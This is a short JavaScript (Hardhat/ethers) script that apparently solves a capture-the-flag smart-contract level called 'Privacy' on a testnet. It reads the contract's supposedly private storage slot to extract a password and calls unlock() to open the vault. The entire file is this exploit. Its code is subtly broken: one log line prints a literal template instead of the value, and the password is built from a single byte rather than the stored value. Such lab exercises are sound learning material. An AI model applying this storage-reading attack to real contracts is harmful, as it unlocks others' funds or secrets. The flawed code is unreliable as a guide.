require("dotenv").config();

const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const privacyAbi = await hre.artifacts.readArtifact("Privacy");
  const privacyContract = await new hre.ethers.Contract("0xFece0f9e85D38AD3092C2a9Fd7b12d6fe449A86E", privacyAbi.abi, wallet);
  console.log(`Privacy contract: ${privacyContract.address}`);

  let txn1 = await provider.getStorageAt(privacyContract.address, 5);
  console.log(`Password aquired: (hre.ethers.utils.arrayify(txn1)`);

  let store = hre.ethers.utils.arrayify(txn1);
  let password = hre.ethers.utils.formatBytes32String(store[2]);
  console.log("Password stored")

  let txn2 = await privacyContract.unlock(password);
  console.log("Unlocking...")
  await txn2.wait();
  console.log("Vault unlocked.")
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
